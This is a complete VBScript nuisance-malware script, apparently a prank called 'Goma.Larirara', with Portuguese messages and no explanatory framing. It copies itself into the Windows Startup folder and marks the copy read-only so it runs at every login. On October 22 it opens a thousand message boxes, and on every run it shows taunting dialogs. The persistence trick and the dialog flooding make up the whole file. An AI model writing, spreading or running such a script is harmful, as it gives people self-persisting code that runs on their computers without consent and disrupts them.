On Error Resume Next
dim filesys, demofile, contador

set filesys = CreateObject ("Scripting.FileSystemObject")
set demofile = filesys.GetFile("larirara.vbs")
demofile.Copy("c:\WINDOWS\Menu Iniciar\Programas\Iniciar\iniciar.vbs")
set demofile = filesys.GetFile("c:\WINDOWS\Menu Iniciar\Programas\Iniciar\iniciar.vbs")
demofile.Attributes = 1

if Month(Date) = 10  and Day(Date) = 22 then 
	For contador = 1 to 1000
	msgbox "Valeu irmãos, sinto falta de vocês, descansem em paz !!!"
	Next
end if

For contador = 1 To 5
	If contador = 1 then
	    MsgBox "Clica em algum lugar ai, pato !", contador
	End if

	If contador = 2 or contador = 3 then
	    MsgBox "Op's tente novamente, clicando em outro botao !", contador
	End if

	If contador = 4 then
	    MsgBox "Nao funciona !!! Ué ???", contador
	Else
	    MsgBox "Nao adianta ???!!!??? hahaha", contador
	End if
Next

For contador = 1 to 5
MsgBox "Bem Vindo ao seu pior pesadelo !!!", VBQuestion,"Goma.Larirara"
Next